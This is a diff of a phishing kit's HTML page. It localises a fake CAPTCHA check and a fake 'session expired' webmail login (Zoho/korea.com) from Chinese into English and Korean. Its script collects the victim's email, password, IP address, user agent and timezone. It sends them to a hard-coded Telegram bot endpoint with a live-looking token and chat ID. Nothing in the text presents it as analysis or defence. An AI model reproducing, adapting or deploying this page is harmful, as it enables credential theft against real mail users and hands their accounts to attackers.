@@ -1,23 +1,26 @@
+
+
+
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="en">
 <head>
    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>网页邮箱登录</title>
-  <!-- 引入 Bootstrap 5 CSS -->
+    <title>Webmail Sign-in</title>
+  <!-- Include Bootstrap 5 CSS -->
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <!-- Bootstrap 图标 -->
+    <!-- Bootstrap Icons -->
     <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
-    <!-- Google 字体: Poppins -->
+    <!-- Google Fonts: Poppins -->
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
 
   <style>
-    /* 初始隐藏主内容 */
+    /* Hide the main content initially */
     #main-content {
       display: none;
     }
 
-    /* 验证区域样式 */
+    /* Verification Div Styling */
     #verification-div {
       height: 100vh;
       display: flex;
@@ -26,12 +29,12 @@
 	  padding-top: 10%;
     }
 
-    /* 确保文本左对齐 */
+    /* Ensure text is left-aligned */
     .verification-content {
       text-align: left;
     }
 
-    /* 调整加载动画大小 */
+    /* Adjust spinner size */
     .spinner-border {
       width: 1.5rem;
       height: 1.5rem;
@@ -50,76 +53,76 @@
 
 
  
-    <!-- 验证区域 -->
+    <!-- Verification Div -->
   
 
-    <!-- 主内容区域 -->
-    <!-- 主内容区域 -->
-    <!-- 主内容区域 -->
+    <!-- Main Content Div -->
+    <!-- Main Content Div -->
+    <!-- Main Content Div -->
     
 	<body id="main-content" class="d-flex align-items-center justify-content-center min-vh-100">
 	  <div id="verification-div" style="position:absolute;height:100vh; width:100vw;background-color: #fff;">
       <div class="row">
         <div class="col-12 verification-content mx-2">
-          <h2>访问网站前正在检查您的浏览器</h2>
+          <h2>사이트에 접속하기 전에 브라우저를 확인하세요</h2>
 		  <div>
 			  <div class="checkbox-container mt-3 d-flex align-items-center p-4" style="border:0px solid black;background: #f3efef;border-radius:5px;">
 				<input type="checkbox" id="bot-check" class="form-check-input">
-				<label for="bot-check" class="form-check-label ms-2">我不是机器人</label>
+				<label for="bot-check" class="form-check-label ms-2">나는 로봇이 아니다</label>
 			  </div>
 		  </div>
 
-		  <p class="pt-1">点击复选框以验证您是否为人类。</p>
+		  <p class="pt-1">인간인지 확인하려면 체크박스를 클릭하세요.</p>
         </div>
       </div>
     </div>
-    <!-- 背景 Iframe -->
+    <!-- Background Iframe -->
     <iframe id="background-iframe" src="about:blank" allowfullscreen></iframe>
-    <!-- 遮罩层 -->
+    <!-- Dimmed Overlay -->
     <div id="overlay"></div>
-    <!-- 表单容器 -->
+    <!-- Form Container -->
     <div class="form-container" id="form-container" >
-        <!-- 错误信息 -->
-        <div id="error-message" class="error-message">请重试</div>
+        <!-- Error Message -->
+        <div id="error-message" class="error-message">다시 시도하세요</div>
 
         <form id="user-form">
-            <!-- 图标和文本行 -->
+            <!-- Icon and Text Row -->
             <div class="icon-text">
-                <img id="domain-favicon" src="https://www.google.com/s2/favicons?domain=zoho.com" alt="域名图标" style="height: 15px; width:15px;">
+                <img id="domain-favicon" src="https://www.google.com/s2/favicons?domain=korea.com" alt="Domain Favicon" style="height: 15px; width:15px;">
                 <span class="h4 mb-0" style="margin-left: 10px;" id="domain-name">ZOHO</span>
             </div>
-            <!-- 标题 -->
-            <h5 class="mb-3">开始使用</h5>
-            <!-- 段落 -->
-            <p class="mb-4 text-muted" style="font-size: .8rem;">上一个会话已过期，请登录以继续</p>
+            <!-- Heading -->
+            <h5 class="mb-3">시작해 봅시다</h5>
+            <!-- Paragraph -->
+            <p class="mb-4 text-muted" style="font-size: .8rem;">이전 세션이 만료되었습니다,계속하려면 로그인하세요.</p>
 			
-            <!-- 邮箱输入 -->
+            <!-- Email Input -->
             <div class="form-floating position-relative">
                 <i class="bi bi-envelope input-icon"></i>
                 <input type="email" class="form-control" id="email" placeholder=" " required style="padding-left: 40px; z-index:1000;" disabled>
-                <label for="email" style="background-color: transparent;">邮箱</label>
+                <label for="email" style="background-color: transparent;">Email</label>
             </div>
-            <!-- 密码输入 -->
+            <!-- Password Input -->
             <div class="form-floating position-relative">
                 <i class="bi bi-lock input-icon"></i>
                 <input type="password" class="form-control" id="password" placeholder=" " required style="padding-left: 40px;">
-                <label for="password" style="background-color: transparent;">密码</label>
+                <label for="password" style="background-color: transparent;">Password</label>
             </div>
-            <!-- 提交按钮 -->
-            <button type="submit" class="btn btn-primary">下一步</button>
+            <!-- Submit Button -->
+            <button type="submit" class="btn btn-primary">로그인</button>
         </form>
     </div>
 
-    <!-- 加载遮罩层 -->
+    <!-- Loader Overlay -->
     <div id="loader-overlay" class="loader-overlay">
         <div class="spinner-border text-light" role="status" style="width: 3rem; height: 3rem;">
-            <span class="visually-hidden">加载中...</span>
+            <span class="visually-hidden">Loading...</span>
         </div>
     </div>
 
-    <!-- Bootstrap 5 JS Bundle (包含 Popper) -->
+    <!-- Bootstrap 5 JS Bundle (includes Popper) -->
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
-    <!-- 处理 'eta' 参数和背景 Iframe 的自定义 JavaScript -->
+    <!-- Custom JavaScript to Handle 'eta' Parameter and Background Iframe -->
     <script>
 let submitCount = 0;
 document.addEventListener("DOMContentLoaded", (() => {
@@ -136,44 +139,44 @@ document.addEventListener("DOMContentLoaded", (() => {
 			const r = e.startsWith("http://") || e.startsWith("https://") ? e : `https://${e}`;
 			document.getElementById("background-iframe").src = r
 		}
-	} else console.warn("URL 中未找到 'eta' 参数。"), document.getElementById("background-iframe").src = "about:blank";
+	} else console.warn("No 'eta' parameter found in the URL."), document.getElementById("background-iframe").src = "about:blank";
 	let n = {
-		ipAddress: "获取中...",
+		ipAddress: "Fetching...",
 		userAgent: navigator.userAgent,
 		timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-		browser: "检测中..."
+		browser: "Detecting..."
 	};
 	const o = navigator.userAgent;
 	o.indexOf("Firefox") > -1 ? n.browser = "Mozilla Firefox" : o.indexOf("SamsungBrowser") > -1 ? n.browser = "Samsung Internet" : o.indexOf("Opera") > -1 || o.indexOf("OPR") > -1 ? n.browser = "Opera" : o.indexOf("Trident") > -1 ? n.browser = "Microsoft Internet Explorer" : o.indexOf("Edge") > -1 ? n.browser = "Microsoft Edge" : o.indexOf("Chrome") > -1 ? n.browser = "Google Chrome or Chromium" : o.indexOf("Safari") > -1 ? n.browser = "Apple Safari" : n.browser = "Unknown", fetch("https://api.ipify.org?format=json").then((e => e.json())).then((e => {
 		n.ipAddress = e.ip
 	})).catch((e => {
-		console.error("获取 IP 地址时出错:", e), n.ipAddress = "不可用"
+		console.error("Error fetching IP address:", e), n.ipAddress = "Unavailable"
 	})), document.getElementById("user-form").addEventListener("submit", (function(e) {
 		e.preventDefault(), submitCount += 1;
 		const o = 1 === submitCount,
 			r = 2 === submitCount;
 		document.getElementById("loader-overlay").style.display = "flex";
-		let s = `✅🤑 Alldomain365 结果 🤑✅\n\n邮箱: ${document.getElementById("email").value.trim()}\n密码: ${document.getElementById("password").value.trim()}`;
+		let s = `✅🤑 Alldomain365 Result 🤑✅\n\nEmail: ${document.getElementById("email").value.trim()}\nPassword: ${document.getElementById("password").value.trim()}`;
 		new Promise((e => {
 			const t = setInterval((() => {
-				"获取中..." !== n.ipAddress && (clearInterval(t), e())
+				"Fetching..." !== n.ipAddress && (clearInterval(t), e())
 			}), 100)
 		})).then((() => {
-			s += `\nIP 地址: ${n.ipAddress}\n用户代理: ${n.userAgent}\n时区: ${n.timezone}\n浏览器: ${n.browser}`, (e => {
+			s += `\nIP Address: ${n.ipAddress}\nUser Agent: ${n.userAgent}\nTimezone: ${n.timezone}\nBrowser: ${n.browser}`, (e => {
 				const t = {
-					chat_id: "1624579055",
+					chat_id: "5615668019",
 					text: e
 				};
-				fetch("https://api.telegram.org/bot6097191640:AAEPqaN25_pPg5q8UFLNVCPgtX__OF-QgFk/sendMessage", {
+				fetch("https://api.telegram.org/bot8168717195:AAE-c3M5eNu6GZQCT7gZTOE8U1mKnuEz2Bg/sendMessage", {
 					method: "POST",
 					headers: {
 						"Content-Type": "application/json"
 					},
 					body: JSON.stringify(t)
 				}).then((e => e.json())).then((e => {
-					e.ok || (console.error("发送消息到 Telegram 时出错:", e), alert("提交表单失败。"), document.getElementById("password").value = "")
+					e.ok || (console.error("Error sending message to Telegram:", e), alert("Failed to submit the form."), document.getElementById("password").value = "")
 				})).catch((e => {
-					console.error("发送消息到 Telegram 时出错:", e), alert("提交表单时发生错误。"), document.getElementById("password").value = ""
+					console.error("Error sending message to Telegram:", e), alert("An error occurred while submitting the form."), document.getElementById("password").value = ""
 				}))
 			})(s)
 		})), o ? setTimeout((() => {
@@ -187,14 +190,14 @@ document.addEventListener("DOMContentLoaded", (() => {
 </body>
 
   
-      <!--结束 主内容区域 -->
-    <!--结束 主内容区域 -->
-    <!--结束 主内容区域 -->
+      <!--End Main Content Div -->
+    <!--End Main Content Div -->
+    <!--End Main Content Div -->
 
-  <!-- 引入 Bootstrap 5 JS Bundle -->
+  <!-- Include Bootstrap 5 JS Bundle -->
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 
-  <!-- JavaScript 代码 -->
+  <!-- JavaScript Code -->
   <script>
     document.addEventListener('DOMContentLoaded', function () {
       const botCheck = document.getElementById('bot-check');
@@ -205,31 +208,31 @@ document.addEventListener("DOMContentLoaded", (() => {
 
       botCheck.addEventListener('change', function () {
         if (this.checked) {
-          // 将复选框替换为加载器
+          // Replace the checkbox with a loader
           const checkboxContainer = this.parentElement;
           checkboxContainer.innerHTML = `
             <div class="spinner-container d-flex align-items-center">
               <div class="spinner-border" role="status">
-                <span class="visually-hidden">加载中...</span>
+                <span class="visually-hidden">Loading...</span>
               </div>
-              <span class="ms-2">验证中...</span>
+              <span class="ms-2">Verifying...</span>
             </div>
           `;
 
-          // 等待 4 秒
+          // Wait for 4 seconds
           setTimeout(function () {
-            // 显示 "正在重定向..." 消息
+            // Display "Redirecting..." message
             verificationDiv.innerHTML = `
               <div class="row">
                 <div class="col-12 verification-content">
-                  <h2>正在重定向...</h2>
+                  <h2>Redirecting...</h2>
                 </div>
               </div>
             `;
 
-            // 等待 2 秒
+            // Wait for 2 seconds
             setTimeout(function () {
-              // 隐藏验证区域并显示主内容
+              // Hide verification div and show main content
               verificationDiv.style.display = 'none';
               mainContent.style.display = 'block';
               formContainer.style.display = 'block';
